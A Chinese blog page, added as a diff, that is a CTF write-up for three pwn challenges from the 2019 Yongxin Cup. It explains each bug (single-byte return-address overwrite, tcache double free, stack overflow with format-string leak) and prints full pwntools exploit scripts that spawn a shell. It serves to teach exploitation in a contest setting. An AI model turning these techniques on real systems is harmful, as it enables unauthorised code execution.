@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="这里总结一下永信杯wp">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;永信杯wp&#39;">
+<meta property="og:url" content="http://yoursite.com/2019/04/13/永信杯wp/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="这里总结一下永信杯wp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/checksec.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/ida_input.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/main.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/backdoor.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/exp.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/tcache_checksec.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/tcache_del.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/pwn_checksec.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/pwn_fun.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/pwn_login.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/pwn_show.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/13/永信杯wp/pwn_leak.png">
+<meta property="og:updated_time" content="2019-09-15T07:44:35.264Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="&#39;永信杯wp&#39;">
+<meta name="twitter:description" content="这里总结一下永信杯wp">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/13/永信杯wp/checksec.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/04/13/永信杯wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>'永信杯wp' | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-3nd???">
+
+    <a href="/3ND/" rel="section"><i class="fa fa-fw fa-user"></i>3ND???</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/永信杯wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="PwnHt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          '永信杯wp'
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-13 17:14:00" itemprop="dateCreated datePublished" datetime="2019-04-13T17:14:00+08:00">2019-04-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-09-15 15:44:35" itemprop="dateModified" datetime="2019-09-15T15:44:35+08:00">2019-09-15</time>
+              </span>
+
+          
+            <div class="post-description">这里总结一下永信杯wp</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>题目链接<a href="https://pan.baidu.com/s/19xe2tWAeMFRJ9Z27zGbYEQ" target="_blank" rel="noopener"></a></p>
+<p>提取码：9vxl</p>
+<h1 id="0x00-checkin"><a href="#0x00-checkin" class="headerlink" title="0x00 checkin"></a>0x00 checkin</h1><h2 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>签到题目直接 <strong>输入cat flag</strong> 命令就可以了</p>
+<h1 id="0x01-ret2moon"><a href="#0x01-ret2moon" class="headerlink" title="0x01 ret2moon"></a>0x01 ret2moon</h1><h2 id="0x0-思路"><a href="#0x0-思路" class="headerlink" title="0x0 思路"></a>0x0 思路</h2><h3 id="0x00-checksec"><a href="#0x00-checksec" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/checksec.png" alt=""></p>
+<p>基本保护全开了</p>
+<h3 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><p><img src="/2019/04/13/永信杯wp/ida_input.png" alt=""><br>由于 <strong>buf的位置</strong> 在 <strong>rbp-0x30</strong> 的位置，但是你能输入 <strong>0x50</strong> 个字节 所以你能控制index arrary的值，最后的效果是允许你修改相对于 <strong>rbp</strong> 任意address。修改1byte,我们再看main函数<br><img src="/2019/04/13/永信杯wp/main.png" alt=""></p>
+<p>这个 <strong>return address</strong> 我们可以控制 <strong>1byte</strong> 而 <strong>main</strong> 函数的下面就是 <strong>backdoor</strong> 函数,也就是<br><img src="/2019/04/13/永信杯wp/backdoor.png" alt=""><br>我们跳转到这里就能 <strong>get shell</strong></p>
+<h3 id="0x02-具体做法"><a href="#0x02-具体做法" class="headerlink" title="0x02 具体做法"></a>0x02 具体做法</h3><p>将 <strong>input_buf</strong> 的 <strong>return</strong> 的最低的一个byte 改为  <strong>E8</strong><br><img src="/2019/04/13/永信杯wp/exp.png" alt=""></p>
+<h2 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h2><p>一开始分析 <strong>input_buf</strong> 函数的时候，由于伪代码不太很好看，所以去分析汇编，就不太记得 <strong>index</strong> 是指针了，所以，以为 <strong>index</strong> 为一个index变量值，因为，<strong>index</strong> 的值是在你输入buf之前复制的，所以我一度认为，无法控制 <strong>index</strong> 的值,从而不能实现 <strong>任意address</strong> 的写入，之后才看到 <strong>index的类型</strong> 是 <strong>指针</strong> ，卡了好久</p>
+<h2 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">r=remote(&apos;211.65.197.117&apos;,10006)</span><br><span class="line">#r=process(&apos;./ret2moon&apos;)</span><br><span class="line">payload=&apos;&apos;</span><br><span class="line">payload=&apos;b&apos;*0x10+p64(0x30+8)</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">r.sendlineafter(&apos;wake&apos;,payload)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">oneword=p8(0xE8)</span><br><span class="line">r.sendlineafter(&apos;word&apos;,oneword)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-tcache-pwn"><a href="#0x02-tcache-pwn" class="headerlink" title="0x02 tcache_pwn"></a>0x02 tcache_pwn</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目没有时间做了，发现了 <strong>double free</strong> 还没来得及细想，比赛已经结束了，经过了一上午终于做出来了，其实 <strong>tcache</strong> 机制还是挺有意思的，虽然我没有系统去研究过它，但是通过一些文章对 <strong>tcache</strong> 机制的介绍， 我对它有了一定的了解，具体可以参照</p>
+<p><a href="https://www.360zhijia.com/anquan/371580.html" target="_blank" rel="noopener">由一道CTF pwn题深入理解libc2.26中的tcache机制</a></p>
+<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><h3 id="0x00-checksec-1"><a href="#0x00-checksec-1" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/tcache_checksec.png" alt=""></p>
+<h3 id="0x01-漏洞点-1"><a href="#0x01-漏洞点-1" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><p><img src="/2019/04/13/永信杯wp/tcache_del.png" alt=""><br>漏洞点在 <strong>detele()</strong> 这个函数里面,由于free的指针没有清零，可以 <strong>double free</strong></p>
+<h3 id="0x02-具体做法-1"><a href="#0x02-具体做法-1" class="headerlink" title="0x02 具体做法"></a>0x02 具体做法</h3><p>首先 <strong>leak libc address</strong> ，然将 <strong>got表的free函数的addres 改成 system的address</strong>，最后,添加一个 <strong>chunk</strong>,内容为 <strong>/bin/sh\0</strong> , <strong>free(chunk)</strong> 其实，实际的结果是执行 <strong>system(“bin/sh”)</strong></p>
+<h2 id="0x2-遇到的问题"><a href="#0x2-遇到的问题" class="headerlink" title="0x2 遇到的问题"></a>0x2 遇到的问题</h2><p>遇到的最大的问题是第一次 <strong>double free</strong> 可以成功，第二次却失败了。究其原因，是由于 <strong>tcache</strong> 机制的特性,free掉的chunk，会首先进入 <strong>tcachebins</strong> 里面，<strong>tcachebins</strong> 基本不做检查，所以你可以 <strong>连续free两次同一个chunk</strong> 那这样的话，你首先 <strong>malloc</strong> 3次，第三个chunk应该就是你想要得到的那个chunk，第四次malloc，还会得到你delete 的那个 chunk ，第五次malloc 你会得到第二次malloc时你填入的内容作为地址去malloc，如果这个地址你是任意填的，那么就会 <strong>crash</strong> ,我就在在这里卡了很久</p>
+<h2 id="0x03-exploit-1"><a href="#0x03-exploit-1" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#r=remote(&apos;192.168.43.150&apos;,8888)</span><br><span class="line">#r=process(&apos;./tcache_pwn&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">def add(length,con):</span><br><span class="line">	r.sendlineafter(&apos;your choice&gt;&apos;,str(1))</span><br><span class="line">	r.sendlineafter(&apos;length&apos;,str(length))</span><br><span class="line">	r.sendafter(&apos;flag&apos;,con)</span><br><span class="line">def put(index):</span><br><span class="line">	r.sendlineafter(&apos;your choice&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">def delete(index):</span><br><span class="line">	r.sendlineafter(&apos;your choice&gt;&apos;,str(3))</span><br><span class="line">	r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">#raw_input(&apos;#&apos;)</span><br><span class="line">add(0x50,&apos;xxxx&apos;)</span><br><span class="line">add(0x50,&apos;xxxx&apos;)</span><br><span class="line">add(0x50,&apos;/bin/sh\0&apos;)</span><br><span class="line">raw_input(&apos;1&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">add(0x50,p64(0x6012A0))</span><br><span class="line">add(0x50,p64(0x601228))</span><br><span class="line">add(0x50,p64(0x601228))</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">#raw_input(&apos;##&apos;)</span><br><span class="line">#raw_input(&apos;xx&apos;)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">r.recv()</span><br><span class="line">put(0)</span><br><span class="line">free_addr=u64(r.recvuntil(&apos;ok&apos;)[1:7].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;add=&apos;+hex(free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[&apos;free&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">add(0x50,&apos;xxx&apos;)</span><br><span class="line">add(0x50,p64(system_addr))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x3-pwn-collection"><a href="#0x3-pwn-collection" class="headerlink" title="0x3 pwn_collection"></a>0x3 pwn_collection</h1><h2 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目就差一点就做出来了，由于自己 <strong>rop功底差</strong>，导致只知道用 <strong>one_gadget</strong> 去 <strong>getshell</strong> ,然而当 <strong>onegadget</strong> 失效的时候，就毫无头绪了，所以，最后一步走不出去，很难受。</p>
+<h2 id="0x01-思路-1"><a href="#0x01-思路-1" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><h3 id="0x00-checksec-2"><a href="#0x00-checksec-2" class="headerlink" title="0x00 checksec()"></a>0x00 checksec()</h3><p><img src="/2019/04/13/永信杯wp/pwn_checksec.png" alt=""><br>没有 <strong>PIE</strong> 和 <strong>canary</strong> 可以考虑 <strong>rop</strong></p>
+<h3 id="0x01-函数功能"><a href="#0x01-函数功能" class="headerlink" title="0x01 函数功能"></a>0x01 函数功能</h3><p>函数有好多，做一个图表<br><img src="/2019/04/13/永信杯wp/pwn_fun.png" alt=""></p>
+<h3 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h3><p>这个程序漏洞有两个，也许不止两个，但是两个漏洞已经够用了</p>
+<h4 id="0x00-rop"><a href="#0x00-rop" class="headerlink" title="0x00 rop"></a>0x00 rop</h4><p><img src="/2019/04/13/永信杯wp/pwn_login.png" alt=""><br>这个漏洞发生在 <strong>login</strong> 函数中，我们可以看到 <strong>v1</strong> 的位置在 <strong>rbp-30h</strong> 但是它却允许你输入 <strong>0x50</strong> 个字节，造成栈溢出，可以实现 <strong>任意address跳转</strong></p>
+<h4 id="0x00-format-string"><a href="#0x00-format-string" class="headerlink" title="0x00 format string"></a>0x00 format string</h4><p><img src="/2019/04/13/永信杯wp/pwn_show.png" alt=""><br>我可以看到这个函数是直接 <strong>printf((&amp;note_point)[index], &amp;index)</strong> 而 <strong>note_point</strong> 是存储指向 <strong>heap</strong> 的指针的数组，如果我们我们的 <strong>note</strong> 的内容为 <strong>%lx，%lx,%lx，%lx…</strong> 它就会打印栈上的内容</p>
+<h3 id="0x03-具体做法"><a href="#0x03-具体做法" class="headerlink" title="0x03 具体做法"></a>0x03 具体做法</h3><p>format string触发的时候，很幸运，栈上有我们的想要的地址。<br><img src="/2019/04/13/永信杯wp/pwn_leak.png" alt=""><br>算一下 <strong>offset</strong> 就可以得到 <strong>libc_base</strong> 之后就 <strong>call system（）</strong> 或者 跳 <strong>one_gadget address</strong></p>
+<h2 id="0x02-遇到问题"><a href="#0x02-遇到问题" class="headerlink" title="0x02 遇到问题"></a>0x02 遇到问题</h2><p>最大的问题是 <strong>one_gadget</strong> 坏掉了，所以，就需要 <strong>call system()</strong> 但是，控制参数，我就毫无头绪了，最后，卡在这里，没做出来。之后，问出题人，出题人师傅说，直接在 <strong>lib.so</strong> 里面找 <strong>pop edi</strong> 的 <strong>gadget</strong> 就可以了，学到了</p>
+<h2 id="0x03-exploit-2"><a href="#0x03-exploit-2" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#r=remote(&apos;211.65.197.117&apos;,10008)</span><br><span class="line">r=process(&apos;./pwn_collection&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">def reg(name,passwd):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(1))</span><br><span class="line">	r.sendlineafter(&apos;\n&gt;&apos;,name)</span><br><span class="line">	r.sendlineafter(&apos;\n&gt;&apos;,passwd)</span><br><span class="line">def login(index,passwd):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">	r.sendlineafter(&apos;\n&gt;&apos;,passwd)</span><br><span class="line">def delete(index):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(3))</span><br><span class="line">	r.sendlineafter(&apos;index&apos;,str(index))</span><br><span class="line">def add(length,con):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(1))</span><br><span class="line">	r.sendlineafter(&apos;length&apos;,str(length))</span><br><span class="line">	r.sendlineafter(&apos;note&apos;,con)</span><br><span class="line">def put(index):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(2))</span><br><span class="line">        r.sendlineafter(&apos;idx&apos;,str(index))</span><br><span class="line">def dele(index):</span><br><span class="line">	r.sendlineafter(&apos;chioce&gt;&apos;,str(3))</span><br><span class="line">	r.sendlineafter(&apos;idx&apos;,str(index))</span><br><span class="line">reg(&apos;a&apos;,&apos;a&apos;)</span><br><span class="line">login(0,&apos;a&apos;)</span><br><span class="line">payload=&apos;%lx,&apos;*20</span><br><span class="line">#raw_input(&apos;###&apos;)</span><br><span class="line">add(0x55,payload)</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line"></span><br><span class="line">put(0)</span><br><span class="line">r.recvuntil(&apos;\n&apos;)</span><br><span class="line">put_addr=int(r.recvuntil(&apos;\n&apos;)[84:96],16)-362</span><br><span class="line">print &apos;put_addr=&apos;+hex(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;libc_base=&apos;+hex(libc_base)</span><br><span class="line">pop_edi=libc_base+0x21102</span><br><span class="line">bin_sh= 0x18cd57+libc_base</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,&apos;4&apos;)</span><br><span class="line">payload1=&apos;&apos;</span><br><span class="line">payload1+=&apos;\x00&apos;*(0x30)+&apos;a&apos;*8+p64(pop_edi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">login(0,payload1)</span><br><span class="line">raw_input(&apos;####&apos;)</span><br><span class="line">r.sendlineafter(&apos;chioce&gt;&apos;,&apos;4&apos;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf-pwn/" rel="tag"># ctf,pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/04/09/pwn常规操作/" rel="next" title="'pwn常规操作'">
+                  <i class="fa fa-chevron-left"></i> 'pwn常规操作'
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/04/23/未解决为题/" rel="prev" title="'未解决为题'">
+                  '未解决为题' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-checkin"><span class="nav-number">1.</span> <span class="nav-text">0x00 checkin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-思路"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-ret2moon"><span class="nav-number">2.</span> <span class="nav-text">0x01 ret2moon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0-思路"><span class="nav-number">2.1.</span> <span class="nav-text">0x0 思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-checksec"><span class="nav-number">2.1.1.</span> <span class="nav-text">0x00 checksec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞点"><span class="nav-number">2.1.2.</span> <span class="nav-text">0x01 漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-具体做法"><span class="nav-number">2.1.3.</span> <span class="nav-text">0x02 具体做法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-遇到的问题"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 遇到的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exploit"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-tcache-pwn"><span class="nav-number">3.</span> <span class="nav-text">0x02 tcache_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-思路"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-checksec-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">0x00 checksec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞点-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">0x01 漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-具体做法-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">0x02 具体做法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-遇到的问题"><span class="nav-number">3.3.</span> <span class="nav-text">0x2 遇到的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exploit-1"><span class="nav-number">3.4.</span> <span class="nav-text">0x03 exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-pwn-collection"><span class="nav-number">4.</span> <span class="nav-text">0x3 pwn_collection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言-1"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-思路-1"><span class="nav-number">4.2.</span> <span class="nav-text">0x01 思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-checksec-2"><span class="nav-number">4.2.1.</span> <span class="nav-text">0x00 checksec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-函数功能"><span class="nav-number">4.2.2.</span> <span class="nav-text">0x01 函数功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞点"><span class="nav-number">4.2.3.</span> <span class="nav-text">0x02 漏洞点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-rop"><span class="nav-number">4.2.3.1.</span> <span class="nav-text">0x00 